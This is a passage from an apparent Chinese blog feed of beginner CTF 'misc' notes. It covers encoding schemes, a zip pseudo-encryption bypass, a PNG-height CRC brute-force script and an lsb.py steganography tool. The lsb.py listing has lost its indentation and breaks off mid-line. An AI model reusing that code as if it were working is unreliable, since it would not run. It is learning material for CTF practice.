class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;B4se_1s_3asy!&#125;</span><br></pre></td></tr></table></figure><h2 id="Morse编码"><a href="#Morse编码" class="headerlink" title="Morse编码"></a>Morse编码</h2><p><img src="https://i.loli.net/2021/02/03/Qqruti1sXbd2Rzg.png" alt="image-20210203165953459"></p><p><a href="https://www.bejson.com/enc/morse/" target="_blank" rel="noopener">https://www.bejson.com/enc/morse/</a></p><h2 id="敲击码"><a href="#敲击码" class="headerlink" title="敲击码"></a>敲击码</h2><p><img src="https://i.loli.net/2021/02/03/UopVyCM7wqaL1Yl.png" alt></p><h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p><img src="https://i.loli.net/2021/02/03/FltawBEDbR7I5eC.png" alt="image-20210203163127799"></p><p>补二维码可以用qrazybox</p><p><a href="https://github.com/Merricx/qrazybox" target="_blank" rel="noopener">https://github.com/Merricx/qrazybox</a></p><p>多张图片合成一张二维码可以使用PS：新建一个画布，将图片一个个拖进来。</p><h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><p>密文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\u66\u6c\u61\u67\u7b\u57\u33\u6c\u63\u30\u6d\u65\u21\u7d</span><br></pre></td></tr></table></figure><p>这是Unicode编码，\u后面的数字是ASCII码，是十六进制的，转换成十进制后对照ASCII码表即可得到flag。</p><h2 id="encode"><a href="#encode" class="headerlink" title="encode"></a>encode</h2><p>明文都是：alert(1)</p><p>aaencode: <a href="http://www.atoolbox.net/Tool.php?Id=703" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=703</a></p><p><img src="https://i.loli.net/2021/02/03/MrHGDx3pJ6lAXTm.png" alt="image-20210203163932622"></p><p>JS代码转成常用的网络表情，即颜文字js加密。</p><p>jjencode: <a href="http://www.atoolbox.net/Tool.php?Id=704" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=704</a></p><p><img src="https://i.loli.net/2021/02/03/8yrAnb7jZsEQ94K.png" alt="image-20210203164044945"></p><p>uuencode: <a href="http://www.atoolbox.net/Tool.php?Id=731" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=731</a></p><p><img src="https://i.loli.net/2021/02/03/TfA6IB81zojlEXM.png" alt="image-20210203164146108"></p><p>jsfuck: 只有6个字符。<a href="https://www.sojson.com/jsfuck.html" target="_blank" rel="noopener">https://www.sojson.com/jsfuck.html</a></p><p><img src="https://i.loli.net/2021/02/03/J3TYGL1RwISoupc.png" alt="image-20210203164238256"></p><p>brainfuck 和 okk：<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p><p><img src="https://i.loli.net/2021/02/03/JYW3xPDy75BrKF1.png" alt="image-20210203164556965"></p><p><img src="https://i.loli.net/2021/02/03/r24zbtDomXAIMTn.png" alt="image-20210203164608265"></p><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>参考这篇文章：<code>https://www.cnblogs.com/xishaonian/p/7713657.html</code></p><p>将压缩文件zip1.zip下载下来，使用bandzip打开，发现里面有个flag.txt, 但是解压打开提示需要密码。将整个zip1.zip拖到010中打开。</p><p><img src="https://i.loli.net/2021/02/08/j1RJaryDnF8IuGz.png" alt="image-20210208205607436"></p><p>将09修改为00，保存后，解压打开flag.txt即可。</p><p><img src="https://i.loli.net/2021/02/08/8qFRUZPT3pmJwOz.png" alt="image-20210208205736768"></p><h1 id="古怪的编码"><a href="#古怪的编码" class="headerlink" title="古怪的编码"></a>古怪的编码</h1><h2 id="社会主义核心价值观"><a href="#社会主义核心价值观" class="headerlink" title="社会主义核心价值观"></a>社会主义核心价值观</h2><p><a href="http://www.atoolbox.net/Tool.php?Id=850" target="_blank" rel="noopener">http://www.atoolbox.net/Tool.php?Id=850</a></p><h2 id="与佛论禅"><a href="#与佛论禅" class="headerlink" title="与佛论禅"></a>与佛论禅</h2><p><a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p><h2 id="熊曰"><a href="#熊曰" class="headerlink" title="熊曰"></a>熊曰</h2><p><a href="http://hi.pcmoe.net/" target="_blank" rel="noopener">http://hi.pcmoe.net/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天继续学习misc, 主要是各种编码。&lt;/p&gt;
&lt;p&gt;各种编码集合的文章：&lt;a href=&quot;https://blog.csdn.net/dyw_666666/article/details/89973048&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF入门" scheme="https://ggyggy666.github.io/categories/CTF%E5%85%A5%E9%97%A8/"/>
    
    
      <category term="涅普CTF入门-misc（二）" scheme="https://ggyggy666.github.io/tags/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    
  </entry>
  
  <entry>
    <title>涅普CTF入门-misc（一）</title>
    <link href="https://ggyggy666.github.io/2021/02/02/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc/"/>
    <id>https://ggyggy666.github.io/2021/02/02/%E6%B6%85%E6%99%AECTF%E5%85%A5%E9%97%A8-misc/</id>
    <published>2021-02-02T12:58:19.000Z</published>
    <updated>2021-02-09T12:59:31.075Z</updated>
    
    <content type="html"><![CDATA[<p>之前报名了涅普高校计划，白嫖了一个零组的邀请码。昨天开始讲课，在此总结一下。</p><h1 id="MISC简介"><a href="#MISC简介" class="headerlink" title="MISC简介"></a>MISC简介</h1><p>miscellaneous。主要类型：</p><ol><li>数据编码/图形密码</li><li>图片隐写</li><li>音频&amp;视频隐写</li><li>流量分析</li><li>内存取证</li><li>游戏隐写</li></ol><h1 id="010-Editor的使用"><a href="#010-Editor的使用" class="headerlink" title="010-Editor的使用"></a>010-Editor的使用</h1><h2 id="界面"><a href="#界面" class="headerlink" title="界面"></a>界面</h2><p><img src="https://i.loli.net/2021/02/02/CkO8wNfZ6PXtmvn.png" alt="image-20210202210208847"></p><p>打开一张图片后，可以看到转成16进制后的图片内容，下方是模板，将图片内容分成一块块的，可以用alt+4显示模板。可以在十六进制内容中进行增加修改操作。软件右下角点击即可切换增加或者修改模式。</p><p><img src="https://i.loli.net/2021/02/02/gkXA8NB5vPOsarx.png" alt="image-20210202210959182"></p><h2 id="新生成文件"><a href="#新生成文件" class="headerlink" title="新生成文件"></a>新生成文件</h2><p><img src="https://i.loli.net/2021/02/02/mHwW16qYtQnjIc8.png" alt="image-20210202211240179"></p><ol><li>点击左上角的New新建一个文件</li><li>在新文件中点击选择十六进制。</li><li>在原来图片文件使用Ctrl+A选择全部内容，复制，在新文件中Ctrl+shift+V粘贴。</li><li>此时还不是图片文件。按下F5，弹出的框中选择图片后缀，点击Run。</li></ol><h2 id="查找高度"><a href="#查找高度" class="headerlink" title="查找高度"></a>查找高度</h2><ol><li>右键图片，点击属性，查看它的分辨率。</li><li>将分辨率第一个值转换成十六进制。</li><li>在模板中，Ctrl+F搜索那个十六进制值即可。</li></ol><h1 id="常见格式文件头"><a href="#常见格式文件头" class="headerlink" title="常见格式文件头"></a>常见格式文件头</h1><p>JPEG：FFD8FF</p><p>PNG：89504E47</p><p>GIF：474946383961</p><p>TIFF：49492A00</p><p>bmp: 424D</p><p>CAD: 41433130</p><p>psd: 38425053</p><p>rtf: 7B5C727466</p><p>xml: 3C3F786D6C</p><h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ol><li>右击属性：直接右键图片，查看详细信息。</li><li>文件末尾藏有字符串</li><li>文件包含</li><li>修改文件头：破坏文件头，图片一定不能显示；破坏文件尾，图片可能可以显示。</li><li>GIF</li><li>png(bmp)</li><li>JPG</li><li>双图隐写</li><li>stegpy</li><li>silenteye</li></ol><h2 id="文件藏有字符串"><a href="#文件藏有字符串" class="headerlink" title="文件藏有字符串"></a>文件藏有字符串</h2><p>使用010打开图片，查看末尾隐藏的字符串。但如果不是末尾，很难肉眼找到。因此需要使用kali的工具（strings、grep、）。</p><p>命令：<code>strings strings.jpg</code></p><p><img src="https://i.loli.net/2021/02/02/Hn8hWUrRbeptZyP.png" alt="image-20210202213352327"></p><p>命令：<code>grep -a &quot;BJD&quot; grep.jpeg</code></p><p><img src="https://i.loli.net/2021/02/02/7lPFmZVHfvEbGcR.png" alt="image-20210202215451329">其中BJD是要匹配的字符串。</p><p>命令：<code>file gg</code></p><p><img src="https://i.loli.net/2021/02/02/65iWFSXbflUByDG.png" alt="image-20210202215738427"></p><p>当一个文件没有后缀名时，可以使用<code>file 文件名</code>来查看文件类型。</p><h2 id="两个图片合在一个图片"><a href="#两个图片合在一个图片" class="headerlink" title="两个图片合在一个图片"></a>两个图片合在一个图片</h2><p>使用binwalk来辨别。<code>binwalk xxx.jpg</code></p><p><img src="https://i.loli.net/2021/02/02/4wfDrj5iHRxyNPt.png" alt="image-20210202220231459"></p><p>可以看到识别出了有两张图片。使用<code>binwalk -e xxx.jpg</code>, 会生成一个文件夹。</p><p>使用<code>foremost xxx.jpg</code>, 需要先安装foremost：<code>apt install foremost</code></p><p><img src="https://i.loli.net/2021/02/02/lrkLc5FQ4KVDRBW.png" alt="image-20210202220540785"></p><p>生成一个output文件夹，里面就是分离出来的两张图片。</p><h2 id="GIF图片隐写"><a href="#GIF图片隐写" class="headerlink" title="GIF图片隐写"></a>GIF图片隐写</h2><ol><li>将GIF图片放到PS中打开，看图层得flag。</li><li>使用Stegsolve工具打开gif图片。</li></ol><p><img src="https://i.loli.net/2021/02/02/sZgVd1GwBXY86uS.png" alt="image-20210202221710854"></p><p>打开图片后，先按Analyse，选择Frame Browser。弹框，然后点击箭头下一帧直到看到flag。</p><ol start="3"><li>使用Ulead GIF工具打开GIF图片，查看时间间隔，即每帧之间的间隔。比如是：0.1s, 0.2s, 0.1s, 0.2s….有可能这些间隔有猫腻。如果0.1s是0，0.2s是1，得到：0101…二进制数字。</li><li>有些帧是重叠的无法看清，需要使用工具：Namo_GIF。</li></ol><h2 id="png"><a href="#png" class="headerlink" title="png"></a>png</h2><h3 id="IHDR、zlib"><a href="#IHDR、zlib" class="headerlink" title="IHDR、zlib"></a>IHDR、zlib</h3><p>首先是打开CTF题目，发现图片无法显示，很可能是CRC校验和出错了。使用脚本来下载图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import io,sys</span><br><span class="line">sys.stdout &#x3D; io.TextIOWrapper(sys.stdout.buffer,encoding&#x3D;&#39;utf-8&#39;) #控制输出的编码，可以不要</span><br><span class="line">response &#x3D; requests.get(&#39;http:&#x2F;&#x2F;ctf5.shiyanbar.com&#x2F;stega&#x2F;IHDR.png&#39;)</span><br><span class="line"> </span><br><span class="line">cat_img &#x3D; str(response.text).encode(&#39;utf-8&#39;)</span><br><span class="line">#出现bytes错误，TypeError: a bytes-like object is required, not &#39;str&#39;</span><br><span class="line">#str通过encode()方法可以编码为指定的bytes</span><br><span class="line">print(cat_img)</span><br><span class="line"> </span><br><span class="line">with open(&#39;ihdr1.png&#39;,&#39;wb&#39;) as f:</span><br><span class="line">    f.write(cat_img)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure><p>下载之后保存成了ihdr1.png。</p><p>使用010打开png图片，查看IHDR位置，得到宽和高。</p><p><img src="https://i.loli.net/2021/02/03/eDYMd3Qf7VbgqFO.png" alt="image-20210203143451041"></p><p>可以修改高得到图片下面的东西。但是有些题目可能必须要修改成某个特定值才能显示，就需要爆破。脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import binascii</span><br><span class="line">import struct</span><br><span class="line">misc &#x3D; open(&quot;IHDR.png&quot;,&quot;rb&quot;).read()</span><br><span class="line">#print(misc[0x0c:0x0f+1])</span><br><span class="line"># 爆破高</span><br><span class="line"></span><br><span class="line">crc32_bytes &#x3D; misc[0x1d:0x20+1]# 读出bytes</span><br><span class="line">crc32_hex_eval &#x3D; eval(&#39;0x&#39; + crc32_bytes.hex())#bytes串 -&gt; hex串  -&gt;  值</span><br><span class="line">print(crc32_hex_eval)</span><br><span class="line">for i in range(4096):</span><br><span class="line">    data &#x3D; misc[0x0c:0x0f+1] + misc[0x10:0x13+1] + struct.pack(&#39;&gt;i&#39;,i)+ misc[0x18:0x1c+1]  #IHDR数据</span><br><span class="line">    crc32 &#x3D; binascii.crc32(data) &amp; 0xffffffff</span><br><span class="line">    if crc32 &#x3D;&#x3D; crc32_hex_eval : #IHDR块的crc32值</span><br><span class="line">        print(i)</span><br><span class="line">        print(&quot;height_hex:&quot;+ hex(i))</span><br></pre></td></tr></table></figure><p>得到高度是819. 于是在010中修改高度为819，另存为一个png图片。注意不要直接保存，不然它还是没有修改的。之后就能直接双击打开图片了。</p><p><img src="https://i.loli.net/2021/02/03/Z5CMcEsrm2tdlg6.png" alt="image-20210203143726125"></p><h3 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h3><p>判断是否存在隐写：</p><p>IDAT块都是填充满了才会填充下一块。而如果看到没有填充满就有下一块了，就说明可能存在隐写。使用pngcheck即可判断。</p><p><code>.\pngcheck-2.3.0-win32\pngcheck.exe -v ..\..\..\涅普高校人才培养计划-第一课\png\pngcheck.png</code></p><p><img src="https://i.loli.net/2021/02/02/No7RrV1DaukP2dQ.png" alt="image-20210202224957135"></p><p>可以看到每个IDAT块大小不一，判断存在隐写。使用010打开。</p><p><img src="https://i.loli.net/2021/02/02/emXVJljv74xwo3a.png" alt="image-20210202225143001"></p><p>先点击模板最后一个，可以看到IDAT块的结尾已经被标注了。下一个块开头就是78 9C。然后复制下块的内容</p><p><img src="https://i.loli.net/2021/02/02/VWrwdo5cqKMfklY.png" alt="image-20210202225304464"></p><p>注意，不要把后面结尾的也复制了，而且复制需要使用Ctrl+Shift+C。复制到脚本中，运行即可</p><p><img src="https://i.loli.net/2021/02/02/fhgiVSkIHMmU2px.png" alt="image-20210202225444521"></p><p>成功获取flag。</p><p>但是这个还有更简单的方法。使用上面的<code>binwalk -e pngcheck.png</code>, 会输出一个文件，直接打开就能看到flag。</p><p><img src="https://i.loli.net/2021/02/02/yWrCciXwEBkFmSL.png" alt="image-20210202225810115"></p><p><img src="https://i.loli.net/2021/02/02/9lFtXUQ8SM73Gib.png" alt="image-20210202225837450"></p><h3 id="lsb隐写、lsb加密"><a href="#lsb隐写、lsb加密" class="headerlink" title="lsb隐写、lsb加密"></a>lsb隐写、lsb加密</h3><p>lsb是最低有效位。</p><h4 id="StegSolve"><a href="#StegSolve" class="headerlink" title="StegSolve"></a>StegSolve</h4><p>使用StegSolve打开图片。点击Analyse，Data Extract，然后点击下方图片箭头所指位置（不过可能有些只需要勾选Red或者其它某种颜色的），最后点击Preview。（可以看看链接：<a href="https://cnblogs.com/cat47/p/11483478.html" target="_blank" rel="noopener">https://cnblogs.com/cat47/p/11483478.html</a>)</p><p><img src="https://i.loli.net/2021/02/02/uhr8c4tPgJ9ZEKn.png" alt="image-20210202230618836"></p><p>拖到最上方，可以看到一个PNG，说明这张图片里面还隐藏了一个PNG图片。可以点击Save Bin</p><p><img src="https://i.loli.net/2021/02/02/2gsNInCVS3UredD.png" alt="image-20210202231309455"></p><p> 保存图片，由于已经知道了是png图片，因此保存成222.png。</p><p><img src="https://i.loli.net/2021/02/02/9GXcCFvuyxY4oIT.png" alt="image-20210202231405212"></p><p>得到一张二维码图片。使用QQ扫一扫即可。</p><p>还有一道题。还是像上面那样操作，得到文件头是PK</p><p><img src="https://i.loli.net/2021/02/09/lLjInxt8XGUhoW6.png" alt="image-20210209120430233"></p><p>然后保存成zip格式的文件。直接双击打开会出现文件已损坏，不过随后出现一个1文件。解压后，将1文件使用010打开，寻找flag即可。</p><p><img src="https://i.loli.net/2021/02/09/NT4zMsbGiC93yfc.png" alt="image-20210209120559820"></p><h4 id="zsteg"><a href="#zsteg" class="headerlink" title="zsteg"></a>zsteg</h4><p>它在kali上。直接一条命令：<code>zsteg  xxx.png</code>, 可以看到隐藏的图片类型。如果没有，加上-a，即：<code>zsteg -a xxx.png</code>。</p><p><code>zsteg -e 图片类型所在通道 图片名称 &gt; 123.png</code></p><p>就可以将那个隐藏的png输出到123.png。</p><p>注意，kali没有安装这个工具，自行百度安装。</p><h4 id="lsb-py"><a href="#lsb-py" class="headerlink" title="lsb.py"></a>lsb.py</h4><p>可以在工具集中找到。使用方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python lsb.py extract 1.png 1.txt 123456</span><br></pre></td></tr></table></figure><p>使用python2。extract意思是提取。1.png是图片名，1.txt是导出的文件名，123456是密码。</p><p>lsb.py: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br><span class="line">import struct</span><br><span class="line">import numpy</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line"></span><br><span class="line">from crypt import AESCipher</span><br><span class="line"></span><br><span class="line"># Decompose a binary file into an array of bits</span><br><span class="line">def decompose(data):</span><br><span class="line">v &#x3D; []</span><br><span class="line"></span><br><span class="line"># Pack file len in 4 bytes</span><br><span class="line">fSize &#x3D; len(data)</span><br><span class="line">bytes &#x3D; [ord(b) for b in struct.pack(&quot;i&quot;, fSize)]</span><br><span class="line"></span><br><span class="line">bytes +&#x3D; [ord(b) for b in data]</span><br><span class="line"></span><br><span class="line">for b in bytes:</span><br><span class="line">for i in range(7, -1, -1):</span><br><span class="line">v.append((b &gt;&gt; i) &amp; 0x1)</span><br><span class="line"></span><br><span class="line">return v</span><br><span class="line"></span><br><span class="line"># Assemble an array of bits into a binary file</span><br><span class="line">def assemble(v):    </span><br><span class="line">bytes &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">length &#x3D; len(v)</span><br><span class="line">for idx in range(0, len(v)&#x2F;8):</span><br><span class="line">byte &#x3D; 0</span><br><span class="line">for i in range(0, 8):</span><br><span class="line">if (idx*8+i &lt; length):</span><br><span class="line">byte &#x3D; (byte&lt;&lt;1) + v[idx*8+i]                </span><br><span class="line">bytes &#x3D; bytes + chr(byte)</span><br><span class="line"></span><br><span class="line">payload_size &#x3D; struct.unpack(&quot;i&quot;, bytes[:4])[0]</span><br><span class="line"></span><br><span class="line">return bytes[4: payload_size + 4]</span><br><span class="line"></span><br><span class="line"># Set the i-th bit of v to x</span><br><span class="line">def set_bit(n, i, x):</span><br><span class="line">mask &#x3D; 1 &lt;&lt; i</span><br><span class="line">n &amp;&#x3D; ~mask</span><br><span class="line">if x:</span><br><span class="line">n |&#x3D; mask</span><br><span class="line">return n</span><br><span class="line"></span><br><span class="line"># Embed payload file into LSB bits of an image</span><br><span class="line">def embed(imgFile, payload, password):</span><br><span class="line"># Process source image</span><br><span class="line">img &#x3D; Image.open(imgFile)</span><br><span class="line">(width, height) &#x3D; img.size</span><br><span class="line">conv &#x3D; img.convert(&quot;RGBA&quot;).getdata()</span><br><span class="line">print &quot;[*] Input image size: %dx%d pixels.&quot; % (width, height)</span><br><span class="line">max_size &#x3D; width*height*3.0&#x2F;8&#x2F;1024# max payload size</span><br><span class="line">print &quot;[*] Usable payload size: %.2f KB.&quot; % (max_size)</span><br><span class="line"></span><br><span class="line">f &#x3D; open(payload, &quot;rb&quot;)</span><br><span class="line">data &#x3D; f.read()</span><br><span class="line">f.close()</span><br><span class="line">print &quot;[+] Payload size: %.3f KB &quot; % (len(data)&#x2F;1024.0)</span><br><span class="line"></span><br><span class="line"># Encypt</span><br><span class="line">cipher &#x3D; AESCipher(password)</span><br><span class="line">data_enc &#x3D; cipher.encrypt(data)</span><br><span class="line"></span><br><span class="line"># Process data from payload file</span><br><span class="line">v &#x3D; decompose(data_enc)</span><br><span class="line"></span><br><span class="line"># Add until multiple of 3</span><br><span class="line">while(len(v)%3):</span><br><span class="line">v.append(0)</span><br><span class="line"></span><br><span class="line">payload_size &#x3D; len(v)&#x2F;8&#x2F;1024.0</span><br><span class="line">print &quot;[+] Encrypted payload size: %.3f KB &quot; % (payload_size)</span><br><span class="line">if (payload_size &gt; max_size - 4):</span><br><span class="line">print &quot;[-] Cannot embed. File too large&quot;</span><br><span class="line">sys.exit()</span><br><span class="line"></span><br><span class="line"># Create output image</span><br><span class="line">steg_img &#x3D; Image.new(&#39;RGBA&#39;,(width, height))</span><br><span class="line">data_img &#x3D; steg_img.getdata()</span><br><span class="line"></span><br><span class="line">idx &#x3D; 0</span><br><span class="line"></span><br><span class="line">for h in range(height):</span><br><span class="line">for w in range(width):</span><br><span class="line">(r, g, b, a) &#x3D; conv.getpixel((w, h))</span><br><span class="line">if idx &lt; len(v):</span><br><span class="line">r &#x3D; set_bit(r, 0, v[idx])</span><br><span class="line">g &#x3D; set_bit(g, 0, v[idx+1])</span><br><span class="line">b &#x3D; set_bit(b, 0, v[idx+2])</span><br><span class="line">data_img.putpixel((w,h), (r, g, b, a))</span><br><span class="line">idx &#x3D; idx + 3</span><br><span class="line">    </span><br><span class="line">steg_img.save(imgFile + &quot;-stego.png&quot;, &quot;PNG&quot;)</span><br><span class="line"></span><br><span class="line">print &quot;[+] %s embedded successfully!&quot; % payload</span><br><span class="line"></span><br><span class="line"># Extract data embedded into LSB of the input file</span><br><span class="line">def extract(in_file, out_file, password):</span><br><span class="line"># Process source image</span><br><span class="line">img &#x3D; Image.open(in_file)</span><br><span class="line">(width, height) &#x3D; img.size</span><br><span class="line">conv &#x3D; img.convert(&quot;RGBA&quot;).getdata()</span><br><span class="line">print &quot;[+] Image size: %dx%d pixels.&quot; % (width, height)</span><br><span class="line"></span><br><span class="line"># Extract LSBs</span><br><span class="line">v &#x3D; []</span><br><span class="line">for h in range(height):</span><br><span class="line">for w in range(width):</span><br><span class="line">(r, g, b, a) &#x3D; conv.getpixel((w, h))</span><br><span class="line">v.append(r &amp; 1)</span><br><span class="line">v.append(g &amp; 1)</span><br><span class="line">v.append(b &amp; 1)</span><br><span class="line"></span><br><span class="line">data_out &#x3D; assemble(v)</span><br><span class="line"></span><br><span class="line"># Decrypt</span><br><span class="line">cipher &#x3D; AESCipher(password)</span><br><span class="line">data_dec &#x3D; cipher.decrypt(data_out)</span><br><span class="line"></span><br><span class="line"># Write decrypted data</span><br><span class="line">out_f &#x3D; open(out_file, &quot;wb&quot;)</span><br><span class="line">out_f.write(data_dec)</span><br><span class="line">out_f.close()</span><br><span class="line"></span><br><span class="line">print &quot;[+] Written extracted data to %s.&quot; % out_file</span><br><span class="line"></span><br><span class="line"># Statistical analysis of an image to detect LSB steganography</span><br><span class="line">def analyse(in_file):</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">- Split the image into blocks.</span><br><span class="line">- Compute the average value of the LSBs for each block.</span><br><span class="line">- The plot of the averages should be around 0.5 for zones that contain</span><br><span class="line">  hidden encrypted messages (random data).</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">BS &#x3D; 100# Block size </span><br><span class="line">img &#x3D; Image.open(in_file)</span><br><span class="line">(width, height) &#x3D; img.size</span><br><span class="line">print &quot;[+] Image size: %dx%d pixels.&quot; % (width, height)</span><br><span class="line">conv &#x3D; img.convert(&quot;RGBA&quot;).getdata()</span><br><span class="line"></span><br><span class="line"># Extract LSBs</span><br><span class="line">vr &#x3D; []# Red LSBs</span><br><span class="line">vg &#x3D; []# Green LSBs</span><br><span class="line">vb &#x3D; []# LSBs</span><br><span class="line">for h in range(height):</span><br><span class="line">for w in range(width):</span><br><span class="line">(r, g, b, a) &#x3D; conv.getpixel((w, h))</span><br><span class="line">vr.append(r &amp; 1)</span><br><span class="line">vg.append(g &amp; 1)</span><br><span class="line">vb.append(b &amp; 1)</span><br><span class="line"></span><br><span class="line"># Average colours&#39; LSB per each block</span><br><span class="line">avgR &#x3D; []</span><br><span class="line">avgG &#x3D; []</span><br><span class="line">avgB &#x3D; []</span><br><span class="line">for i in range(0, len(vr), BS):</span><br><span class="line">avgR.append(numpy.mean(vr[i:i + BS]))</span><br><span class="line">avgG.append(numpy.mean(vg[i:i + BS]))</span><br><span class="line">avgB.append(numpy.mean(vb[i:i + BS]))</span><br><span class="line"></span><br><span class="line"># Nice plot </span><br><span class="line">numBlocks &#x3D; len(avgR)</span><br><span class="line">blocks &#x3D; [i for i in range(0, numBlocks)]</span><br><span 